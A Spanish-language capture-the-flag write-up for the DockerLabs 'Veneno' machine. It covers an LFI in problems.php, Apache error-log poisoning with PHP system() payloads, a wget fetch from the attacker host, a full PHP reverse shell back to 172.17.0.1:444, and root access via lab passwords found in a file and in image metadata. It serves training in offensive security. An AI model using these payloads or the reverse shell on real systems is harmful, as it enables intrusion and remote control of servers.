

# Writeup Template: Maquina `[ Veneno ]`

- Tags: #Veneno #LogPoisoning
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina Veneno](https://mega.nz/file/kOFDBYJC#mzBiVsOorShPcTLjPfzmesxAiCHxGkKEDAGxAIJ0r0g)

## Configuración del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x veneno.zip
sudo bash auto_deploy.sh veneno.tar
```

---

## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2
 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
```

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py 172.17.0.2 -p 1-6500

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p22,80 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((UbuntuNobe))
```
---

## Enumeracion de [Servicio  Principal]
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2 # No repota nada critico
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 80 172.17.0.2
```
### Descubrimiento de Rutas
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --add-slash
```

**Hallazgos Relevantes:**
```bash
/uploads/: Potentially interesting directory w/ listing on 'apache/2.4.58 (ubuntu)'
```

### Descubrimiento de Archivos
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,php.back,backup,txt,sh,zip,gzip,tar,pl,html,js
```

- **Hallazgos**:
```bash
/index.html           (Status: 200) [Size: 10671]
/uploads              (Status: 301) [Size: 310] [--> http://172.17.0.2/uploads/]
/problems.php         (Status: 200) [Size: 10671]
```

Para esta url probaremos si esta llamando a un parametro y si si probaremos si es vulnerable:
```bash
http://172.17.0.2/problems.php
```

Lanzamos el ataque:
```bash
wfuzz -c --hw 961 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -u "http://172.17.0.2/problems.php?FUZZ=whoami"
```

Tenemos un parametro:
```bash
000007651:   200        0 L      0 W        0 Ch        "backdoor"
```

Ahora probamos si es vulnerable a un **LFI**
```bash
view-source:http://172.17.0.2/problems.php?backdoor=../../../../etc/passwd
```

Vemos que es vulnerable ya que puedo ver el contenido de este archivo, Ahora probaremos un **LogPoisoning** Asi que con **burpsuite** interceptamos la petcion a esta url
```bash
http://172.17.0.2/problems.php?backdoor=../../../etc/hosts
```

Una ves interceptada mandamos la peticion al modo **repeater**: y aqui tenemos una tabla de las posibles rutas que podemos apuntar:


| Ruta                          | Descripción               | Explotación            |
| ----------------------------- | ------------------------- | ---------------------- |
| `/var/log/apache2/access.log` | Logs de acceso de Apache  | Log Poisoning/RCE      |
| `/var/log/apache2/error.log`  | Logs de error de Apache   | Log Poisoning/RCE      |
| `/var/log/nginx/access.log`   | Logs de acceso de Nginx   | Log Poisoning/RCE      |
| `/var/log/auth.log`           | Logs de autenticación     | Credenciales filtradas |
| `/var/log/syslog`             | Log principal del sistema | Información diversa    |
| `/var/log/mail.log`           | Logs de correo            | Información de correo  |
Ahora desde la terminar verificamos cuales son validas para poder probar con el siguiente comando:
```bash
wfuzz -c -w /usr/share/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://172.17.0.2/problems.php\?backdoor=../../../../../../../FUZZ --hw 0
```

Resultado:
```bash
"..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd"                                           
"..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"              
"/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
"/etc/apt/sources.list"                                                            
"/etc/apache2/apache2.conf"                                                        
"/etc/fstab"                                                                       
"/etc/group"                                                                       
"/etc/hosts.allow"                                                                 
"/etc/hosts"                                                                       
"../../../../../../../../../../../../etc/hosts"                                    
"/etc/hosts.deny"                                                                  
"/etc/issue"                                                                       
"/etc/init.d/apache2"                                                              
"/./././././././././././etc/passwd"                                                
"../../../../../../../../../../../../../../../../../../../etc/passwd"              
"../../../etc/passwd"                                                              
"../etc/passwd"                                                                    
"etc/passwd"                                                                       
"../../../../etc/passwd"                                                           
"../../etc/passwd"                                                                 
"../../../../../../../../etc/passwd"                                               
"../../../../../../../../../etc/passwd"                                            
"../../../../../../../../../../../../etc/passwd"                                   
"../../../../../etc/passwd"                                                        
"../../../../../../etc/passwd"                                                     
"../../../../../../../../../../../etc/passwd"                                      
"../../../../../../../../../../etc/passwd"                                         
"../../../../../../../etc/passwd"                                                  
"../../../../../../../../../../../../../etc/passwd"                                
"../../../../../../../../../../../../../../etc/passwd"                             
"../../../../../../../../../../../../../../../../../../../../etc/passwd"           
"../../../../../../../../../../../../../../../../../../etc/passwd"                 
"/etc/passwd"                                                                      
"../../../../../../../../../../../../../../../etc/passwd"                          
"../../../../../../../../../../../../../../../../etc/passwd"                       
"../../../../../../../../../../../../../../../../../../../../../../etc/passwd"     
"../../../../../../../../../../../../../../../../../../../../../etc/passwd"        
"../../../../../../../../../../../../../../../../../etc/passwd"                    
"/etc/nsswitch.conf"                                                               
"/../../../../../../../../../../etc/passwd"                                        
"../../../../../../etc/passwd&=%3C%3C%3C%3C"                                       
"/etc/rpc"                                                                         
"/etc/ssh/sshd_config"                                                             
"/etc/resolv.conf"                                                                 
"/proc/meminfo"                                                                    
"/proc/partitions"                                                                 
"/proc/version"                                                                    
"/proc/self/cmdline"                                                               
"/proc/self/status"                                                                
"/proc/net/route"                                                                  
"/proc/net/dev"                                                                    
"/proc/mounts"                                                                     
"/proc/loadavg"                                                                    
"/proc/cpuinfo"                                                                    
"/proc/net/arp"                                                                    
000000652:   200        1172 L   29597 W    294352 Ch   "/var/log/apache2/error.log"                    
000000654:   200        1256 L   31717 W    315172 Ch   "../../../../../../../var/log/apache2/error.log"                                                                 
"///////../../../etc/passwd"                                                       
```

Estos dos son los que nos llaman la atencion: y es lo que probaremos desde burpsuite:
```bash
000000652:   200        1172 L   29597 W    294352 Ch   "/var/log/apache2/error.log"                    
000000654:   200        1256 L   31717 W    315172 Ch   "../../../../../../../var/log/apache2/error.log"
```

Ahora si que podemos ver el contenido del **error.log** ejecutando esta desde **burpsuite**
```bash
GET /problems.php?backdoor=../../../../var/log/apache2/error.log HTTP/1.1
```

Desde la terminar para envenar el **log** de apache tendremos que lanzar una peticion con el comando curl:
```bash
curl -s -X GET http://172.17.0.2/probando.php # Archivo que no existe
```

ahora recargamos desde **burpsuite** el **error.log** y desde su buscador por **match** filtamos por: **( probando.php )** y vemos que esta registrado en el log:
```bash
[Fri Jun 06 10:34:43.050897 2025] [php:error] [pid 74] [client 172.17.0.1:49346] script '/var/www/html/probando.php' not found or unable to stat
```

Ahora enivaremos desde la terminar este **onliner** **urlencodeado** para que pueda ser interpretado:
```bash
<?php system("whoami"); ?>.php # Normal
<%3fphp+system("whoami")%3b+%3f>.php # UrlEncodeado
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que tenemos ejecucion de comandos desde el archivo **access.log**, subiremos un archivo malicioso en la ruta: **( /uploads )**
```bash
curl -s -X GET http://172.17.0.2/%3C%3Fphp%20system(%27id%27)%20%3F%3E.php 
```
### Ejecucion del Ataque
Crearemos un archivo: **( shell.html )** para despues montar un servidor con **python3** para que este disponible:
```bash
python3 -m http.server 80
```

Ahora intentamos ejecutar el comando que nos permita acceder al directorio: **( /uploads )** para realizar una peticion que nos permita cargar el archivo: **( shell.php )**
```php
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '172.17.0.1';  // CHANGE THIS
$port = 444;       // CHANGE THIS
$chunk_size = 1400;
$shell = 'uname -a; w; id; /bin/bash -i';
$contador = 0;
$debug = 0;
$daemon = 0;
$welcome_message = "  \033[1;34m_____   _   _   _____   _   _   _  __  _____   
 / ____| | | | | |_   _| | \ | | | |/ / |_   _|  
| (___   | |_| |   | |   |  \| | | ' /    | |    
 \___ \  |  _  |   | |   | . ` | |  <     | |    
 ____) | | | | |  _| |_  | |\  | | . \   _| |_   
|_____/  |_| |_| |_____| |_| \_| |_|\_\ |_____|  \033[0m\n";

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);


// Mostrar mensaje de bienvenida a la shell

fwrite($sock, $welcome_message);



while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

    $read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}

}
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}
?>
```

```bash
# Comandos para explotación
<?php system('cd uploads; wget 172.17.0.1; mv shell.html shell.php'); ?>.php
```

### Intrusion
Ahora vemos que tenemos una peticion en nuestro servidor:
```bash
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
172.17.0.2 - - [06/Jun/2025 01:15:51] "GET / HTTP/1.1" 200 -
```

Ahora tendremos que recargar el **erro.log** y despues recargamos la ruta: **( /uploads )** y tendremos nuestro script que mediante el parametro **cmd** ejecuta un comando a nivel de sistema:
```bash
nc -nlvp 444
```

Realizamos la siguiente peticion para que funcione correctamente:
```bash
# Reverse shell o acceso inicial
curl http://172.17.0.2/%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%63%64%20%75%70%6c%6f%61%64%73%3b%20%77%67%65%74%20%31%37%32%2e%31%37%2e%30%2e%31%3b%20%6d%76%20%69%6e%64%65%78%2e%68%74%6d%6c%20%73%68%65%6c%6c%2e%70%68%70%27%29%3b%20%3f%3e%2e%70%68%70
```

Ahora recargamos de nuevo el **erro.log**
```bash
http://172.17.0.2/problems.php?backdoor=/var/log/apache2/error.log
```

Una ves cargardo nos diregimos al directorio: **( /uploads )** y veremos nuestro archivo malicioso, Solo le damos clic y tendremos acceso a la maquina victima.

---

## Escalada de Privilegios
### Enumeracion del Sistema
Listando los archivos del sistema en la ruta: **( /var/www/html )** Tenemos este archivo
```bash
# Comandos clave ejecutados
antiguo_y_fuerte.txt
```

**Hallazgos Clave:**
MIrando el contenido de este archivo vemos:
```bash
Es imposible que me acuerde de la pass es inhackeable pero se que la tenpo en el mismo fichero desde fa 24 anys. trobala buscala 

soy el unico user del sistema.
```

Ahora realizamos una busqueda para determinar si encontramos algun archivo:
```bash
find / -type f -user root -iname "*.txt" 2>/dev/null
```

Tenemos la siguiente ruta con un archivo:
```bash
/usr/share/viejuno/inhackeable_pass.txt
```

Revisando el contenido del archivo:
```bash
cat /usr/share/viejuno/inhackeable_pass.txt
```

Tenemos la contrasena del usuario carlos:
```bash
pinguinochocolatero
```

Ahora nos loguemos como este usuario:
```bash
su carlos $ ( pinguinochocolatero )
```
### Explotacion de Privilegios

###### Usuario `[ Carlos ]`:
Tenemos muchas carpetas en el directorio de este usuario: Asi que buscaremos dentro de todos esas carpetas si existen archivos:
```bash
find . -type f 2>/dev/null
```

Tenemos lo siguiente:
```bash
./carpeta55/.toor.jpg
```

Nos metemos en la ruta donde esta esa imagen: Verificando si existe el binario de python: para poder montar un servidor que nos permita descargar la imagen:
```bash
python3 -m http.server 8080
```

Ahora desde nuestro equipo atacante descargaremos la imagen:
```bash
wget http://172.17.0.2:8080/.toor.jpg
```

Aplicando varias tecnicas de **esteganografia** sobre este imagen logroamos ver una contrasena en los metadatos de la imagen:
```bash
exiftool .toor.jpg
```

Credencial expuesta:
```bash
Image Quality : pingui1730
```

```bash
# Comando para escalar al usuario: ( root )
su root # ( pingui1730 )
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
root@216e2eeefefa:/home/carlos/carpeta55# whoami
root
```

---

## Lecciones Aprendidas
1. Aprendimos a ver logs del sistema atraves de un **LFI**
2. Aprendimos a derivar un **LFI** a una ejecucion **remota de comandos**
3. Aprendimos a realizar envenenamiento del **log** para tomar el control de la maquina

## Recomendaciones de Seguridad
- Verificar los parametros que se empleand mediante la query **php** si son vulnerables
- Los **logs** del sistema no deven estar expuestos